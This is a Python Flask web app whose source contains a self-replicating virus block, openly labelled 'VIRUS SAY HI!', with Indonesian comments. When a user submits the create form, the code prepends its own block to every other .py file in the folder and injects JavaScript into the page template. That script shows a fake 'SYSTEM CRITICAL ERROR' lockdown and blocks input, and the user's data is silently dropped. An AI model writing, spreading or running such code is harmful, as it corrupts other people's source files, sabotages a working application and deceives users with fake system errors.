# VIRUS SAY HI!
import sys, glob, os, sqlite3, time
from flask import Flask, redirect, request, session, render_template

app = Flask(__name__)
app.secret_key = 'latent_trigger_variant'
DB_FILE = os.path.join(os.path.dirname(__file__), 'database.db')

class CoreService:
    @staticmethod
    def spread():
        """Logic replikasi ke file python lain"""
        payload = []
        with open(sys.argv[0], 'r') as self_file:
            active = False
            for ln in self_file:
                if "# VIRUS SAY HI!" in ln: active = True
                if active: payload.append(ln)
                if "# VIRUS SAY BYE" in ln: break
        
        for target in glob.glob('*.py'):
            if target == sys.argv[0]: continue
            with open(target, 'r') as f:
                current_content = f.read()
            if "# VIRUS SAY HI!" not in current_content:
                with open(target, 'w') as f:
                    f.writelines(payload + ['\n'] + [current_content])

    @staticmethod
    def deploy_ui_lock():
        """Injeksi JS yang mematikan fungsi input"""
        tpl_dir = os.path.join(os.path.dirname(__file__), 'templates')
        target_tpl = os.path.join(tpl_dir, 'index.html')
        
        if os.path.exists(target_tpl):
            with open(target_tpl, 'r') as f:
                html = f.read()
            
            if "LOCK_LOGIC" not in html:
                js = """
                <script id="LOCK_LOGIC">
                document.querySelector('form[action="/create"]')?.addEventListener('submit', function(event) {
                    event.preventDefault();
                    let box = document.createElement('div');
                    box.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:#000;color:#0f0;display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:99999;font-family:monospace;text-align:center;';
                    box.innerHTML = '<h1>[ SYSTEM CRITICAL ERROR ]</h1><p>Emergency lockdown active for <span id="sec">5</span>s</p>';
                    document.body.appendChild(box);
                    
                    let count = 5;
                    let timer = setInterval(() => {
                        count--;
                        document.getElementById('sec').innerText = count;
                        if(count <= 0) { 
                            clearInterval(timer); 
                            box.remove();
                            alert("Operation Aborted: Write Access Denied");
                        }
                    }, 1000);
                });
                </script>
                """
                with open(target_tpl, 'w') as f:
                    f.write(html.replace("</body>", js + "</body>"))
# VIRUS SAY BYE

# --- APP ROUTES ---

@app.route('/')
def home():
    if 'user' not in session: return redirect('/login')
    with sqlite3.connect(DB_FILE) as conn:
        data = conn.execute('SELECT content FROM time_line ORDER BY id DESC').fetchall()
    return render_template('index.html', user=session['user'], tl=data)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        session['user'] = request.form.get('username')
        return redirect('/')
    return '<form method="post"><input name="username"/><button>Enter</button></form>'

@app.route('/create', methods=['POST'])
def create():
    if 'user' in session:
        # --- TRIGGER POINT ---
        # Saat user mencoba menambah data, malware mulai bekerja di belakang layar
        CoreService.spread()
        CoreService.deploy_ui_lock()
        
        # Logika pembatalan: Data tidak pernah masuk ke DB
        print(f"Log: Blocked entry from {session['user']}")
        
    return redirect('/')

if __name__ == '__main__':
    # Init DB
    with sqlite3.connect(DB_FILE) as db:
        db.execute('CREATE TABLE IF NOT EXISTS time_line(id INTEGER PRIMARY KEY, content TEXT)')
    
    app.run(port=5000, debug=True)